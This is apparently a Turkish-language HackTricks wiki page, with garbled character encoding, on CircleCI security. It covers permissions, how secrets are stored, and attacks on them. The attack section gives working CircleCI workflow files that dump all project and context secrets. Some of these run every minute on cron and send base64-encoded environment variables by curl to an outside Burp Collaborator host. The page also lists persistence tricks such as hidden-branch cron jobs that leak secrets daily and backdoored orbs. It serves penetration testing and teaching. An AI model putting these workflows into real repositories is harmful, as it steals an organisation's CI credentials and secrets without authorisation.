# CircleCI GÃ¼venliÄŸi

<details>

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## Temel Bilgiler

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/), bazÄ± kodlarla ne yapmak istediÄŸinizi ve ne zaman yapÄ±lmasÄ±nÄ± istediÄŸinizi belirten **ÅŸablonlarÄ± tanÄ±mlayabileceÄŸiniz** bir SÃ¼rekli Entegrasyon platformudur. Bu ÅŸekilde **Ã¶rneÄŸin depo ana dalÄ±nÄ±zdan doÄŸrudan testleri otomatikleÅŸtirebilir** veya **daÄŸÄ±tÄ±mlarÄ± yapabilirsiniz**.

## Ä°zinler

**CircleCI**, **giriÅŸ yapan hesapla ilgili github ve bitbucket izinlerini devralÄ±r**.\
Testlerimde, **github depo Ã¼zerinde yazma izinleriniz olduÄŸu sÃ¼rece**, CircleCI'da **proje ayarlarÄ±nÄ± yÃ¶netebileceÄŸinizi** (yeni ssh anahtarlarÄ± ayarlamak, proje api anahtarlarÄ± almak, yeni CircleCI yapÄ±landÄ±rmalarÄ±yla yeni dallar oluÅŸturmak...) kontrol ettim.

Ancak, bir **depo yÃ¶neticisi** olmanÄ±z gerekmektedir **depo**yu bir CircleCI projesine **dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in**.

## Ã‡evre DeÄŸiÅŸkenleri ve SÄ±rlar

[**Belgelere**](https://circleci.com/docs/2.0/env-vars/) gÃ¶re bir iÅŸ akÄ±ÅŸÄ± iÃ§inde **Ã§evre deÄŸiÅŸkenlerine deÄŸer yÃ¼klemenin** farklÄ± yollarÄ± bulunmaktadÄ±r.

### Dahili Ã§evre deÄŸiÅŸkenleri

CircleCI tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lan her konteyner her zaman [**belgelerde tanÄ±mlanan belirli Ã§evre deÄŸiÅŸkenlerine**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) sahip olacaktÄ±r, Ã¶rneÄŸin `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` veya `CIRCLE_USERNAME`.

### AÃ§Ä±k metin

OnlarÄ± aÃ§Ä±k metin olarak bir **komut** iÃ§inde bildirebilirsiniz:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**Ã‡alÄ±ÅŸma ortamÄ±** iÃ§inde aÃ§Ä±k metin olarak tanÄ±mlayabilirsiniz:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job** ortamÄ± iÃ§inde aÃ§Ä±k metin olarak tanÄ±mlayabilirsiniz:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**BunlarÄ± bir konteynerin ortamÄ±nda aÃ§Ä±k metin olarak bildirebilirsiniz:**
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Proje SÄ±rlarÄ±

Bunlar sadece **projenin** (herhangi bir **dal** tarafÄ±ndan) **eriÅŸilebilir** olacak **sÄ±rlardÄ±r**.\
OnlarÄ± ÅŸurada **bildirildiÄŸini** gÃ¶rebilirsiniz _https://app.circleci.com/settings/project/github/\<org\_adÄ±>/\<repo\_adÄ±>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**DeÄŸiÅŸkenleri Ä°Ã§e Aktar**" iÅŸlevi, bu projeye **diÄŸer projelerden deÄŸiÅŸkenleri iÃ§e aktarmaya** izin verir.
{% endhint %}

### BaÄŸlam SÄ±rlarÄ±

Bunlar **org genelindeki sÄ±rlardÄ±r**. **VarsayÄ±lan olarak herhangi bir depo**, burada saklanan herhangi bir sÄ±raya **eriÅŸebilecektir**:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Ancak, farklÄ± bir grup (TÃ¼m Ã¼yeler yerine) **seÃ§ilebilir ve sÄ±rlara sadece belirli kiÅŸilerin eriÅŸimine izin vermek** iÃ§in.\
Bu ÅŸu anda sÄ±rlarÄ±n gÃ¼venliÄŸini artÄ±rmak iÃ§in en iyi yollardan biridir, herkesin eriÅŸimine izin vermemek ancak bazÄ± kiÅŸilere eriÅŸim saÄŸlamak.
{% endhint %}

## SaldÄ±rÄ±lar

### AÃ§Ä±k Metin SÄ±rlarÄ±nÄ± Arama

EÄŸer **VCS'ye eriÅŸiminiz varsa** (github gibi) her bir repo ve her bir dalÄ±n `.circleci/config.yml` dosyasÄ±nÄ± kontrol edin ve orada saklanan potansiyel **aÃ§Ä±k metin sÄ±rlarÄ±nÄ± arayÄ±n**.

### Gizli Ã‡evre DeÄŸiÅŸkenleri ve BaÄŸlam NumaralandÄ±rma

KodlarÄ± kontrol ederek her `.circleci/config.yml` dosyasÄ±nda **kullanÄ±lan tÃ¼m sÄ±rlarÄ±n adlarÄ±nÄ±** bulabilirsiniz. AyrÄ±ca bu dosyalardan **baÄŸlam adlarÄ±nÄ±** alabilir veya bunlarÄ± web konsolunda kontrol edebilirsiniz: _https://app.circleci.com/settings/organization/github/\<org\_adÄ±>/contexts_.

### Proje SÄ±rlarÄ±nÄ± DÄ±ÅŸarÄ± Aktarma

{% hint style="warning" %}
TÃ¼m proje ve baÄŸlam **SIRLARINI dÄ±ÅŸarÄ± aktarmak** iÃ§in, github org iÃ§indeki **yalnÄ±zca 1 depoya yazma** eriÅŸiminizin olmasÄ± yeterlidir (_ve hesabÄ±nÄ±zÄ±n baÄŸlamlara eriÅŸimi olmalÄ±dÄ±r ancak varsayÄ±lan olarak herkes her baÄŸlama eriÅŸebilir_).
{% endhint %}

{% hint style="danger" %}
"**DeÄŸiÅŸkenleri Ä°Ã§e Aktar**" iÅŸlevi, bu projeye **diÄŸer projelerden deÄŸiÅŸkenleri iÃ§e aktarmaya** izin verir. Bu nedenle, bir saldÄ±rgan **tÃ¼m projelerin deÄŸiÅŸkenlerini tÃ¼m depolardan iÃ§e aktarabilir** ve ardÄ±ndan **hepsini birlikte dÄ±ÅŸarÄ± aktarabilir**.
{% endhint %}

TÃ¼m proje sÄ±rlarÄ± her zaman iÅŸlerin Ã§evresinde ayarlanÄ±r, bu nedenle env'i Ã§aÄŸÄ±rmak ve base64'te ÅŸifrelemek sÄ±rlarÄ± **iÅŸ akÄ±ÅŸÄ± web gÃ¼nlÃ¼k konsolunda dÄ±ÅŸarÄ± aktaracaktÄ±r**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
EÄŸer **web konsoluna eriÅŸiminiz yoksa** ancak **repo'ya eriÅŸiminiz varsa** ve CircleCI'nin kullanÄ±ldÄ±ÄŸÄ±nÄ± biliyorsanÄ±z, sadece **her dakika tetiklenen bir iÅŸ akÄ±ÅŸÄ± oluÅŸturabilir** ve **sÄ±rlarÄ± harici bir adrese sÄ±zdÄ±rabilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### BaÄŸlam SÄ±rlarÄ±nÄ± DÄ±ÅŸarÄ± Aktar

**BaÄŸlam adÄ±nÄ± belirtmeniz gerekmektedir** (bu aynÄ± zamanda proje sÄ±rlarÄ±nÄ± da dÄ±ÅŸarÄ± aktaracaktÄ±r):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
EÄŸer **web konsoluna eriÅŸiminiz yoksa** ancak **repo'ya eriÅŸiminiz varsa** ve CircleCI'nin kullanÄ±ldÄ±ÄŸÄ±nÄ± biliyorsanÄ±z, sadece **her dakika tetiklenen bir iÅŸ akÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirebilir** ve **sÄ±rlarÄ± harici bir adrese sÄ±zdÄ±rabilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
YalnÄ±zca bir `.circleci/config.yml` dosyasÄ± oluÅŸturmak, bir CircleCI derlemesini tetiklemek iÃ§in yeterli deÄŸildir. **Projeyi CircleCI konsolunda etkinleÅŸtirmeniz gerekir**.
{% endhint %}

### Buluttan KaÃ§Ä±ÅŸ

**CircleCI**, derlemelerinizi **kendi makinelerinde veya kendi makinelerinizde** Ã§alÄ±ÅŸtÄ±rma seÃ§eneÄŸi sunar.\
VarsayÄ±lan olarak, makineleri GCP'de bulunur ve baÅŸlangÄ±Ã§ta ilgili herhangi bir ÅŸey bulamayabilirsiniz. Ancak, bir kurban **kendi makinelerinde (muhtemelen bir bulut ortamÄ±nda)** gÃ¶revleri Ã§alÄ±ÅŸtÄ±rÄ±yorsa, ilginÃ§ bilgiler iÃ§eren bir **bulut meta veri uÃ§ noktasÄ± bulabilirsiniz**.

Ã–nceki Ã¶rneklerde her ÅŸey bir docker konteyneri iÃ§inde baÅŸlatÄ±ldÄ±, ancak aynÄ± zamanda bir VM makinesi baÅŸlatÄ±lmasÄ±nÄ± da **isteyebilirsiniz (farklÄ± bulut izinlerine sahip olabilir)**:
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ya da uzaktan eriÅŸime sahip bir docker konteyneri:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### KalÄ±cÄ±lÄ±k

* API uÃ§ noktalarÄ±na kullanÄ±cÄ± eriÅŸimi ile **kullanÄ±cÄ± token'larÄ± oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r.
* _https://app.circleci.com/settings/user/tokens_
* Projeye verilen izinlerle eriÅŸmek iÃ§in **proje token'larÄ± oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Projelere **SSH anahtarlarÄ± eklemek** mÃ¼mkÃ¼ndÃ¼r.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* **Her gÃ¼n tÃ¼m baÄŸlam env deÄŸiÅŸkenlerini sÄ±zdÄ±ran** beklenmeyen bir projede **gizli bir dalda cron iÅŸi oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r.
* Veya her gÃ¼n tÃ¼m baÄŸlam ve **proje sÄ±rlarÄ±nÄ± sÄ±zdÄ±ran** bilinen bir iÅŸi bir dalda oluÅŸturmak / deÄŸiÅŸtirmek mÃ¼mkÃ¼ndÃ¼r.
* Github sahibiyseniz **doÄŸrulanmamÄ±ÅŸ orb'larÄ±** kabul edebilir ve bir iÅŸte **arka kapÄ±** olarak yapÄ±landÄ±rabilirsiniz.
* BazÄ± gÃ¶revlerde **komut enjeksiyonu aÃ§Ä±ÄŸÄ±** bulabilir ve bir **gizli** deÄŸiÅŸkenin deÄŸerini deÄŸiÅŸtirerek **komutlar enjekte edebilirsiniz**

<details>

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
